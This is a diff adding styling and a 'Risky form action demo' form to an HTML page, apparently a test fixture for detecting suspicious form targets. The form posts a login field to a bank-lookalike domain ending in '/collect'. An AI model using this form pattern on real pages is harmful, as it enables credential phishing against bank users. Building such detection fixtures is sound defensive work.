@@ -28,6 +28,21 @@
       code {
         font-size: 0.9em;
       }
+
+      form {
+        display: grid;
+        gap: 10px;
+        margin-top: 24px;
+        padding: 16px;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+      }
+
+      input,
+      button {
+        padding: 8px 10px;
+        font: inherit;
+      }
     </style>
   </head>
   <body>
@@ -69,6 +84,15 @@
           </tr>
         </tbody>
       </table>
+
+      <form action="https://mbank-login24.pl/collect" method="post">
+        <strong>Risky form action demo</strong>
+        <label>
+          Demo login
+          <input name="login" autocomplete="off" value="test-user">
+        </label>
+        <button type="submit">Submit test form</button>
+      </form>
     </main>
   </body>
 </html>
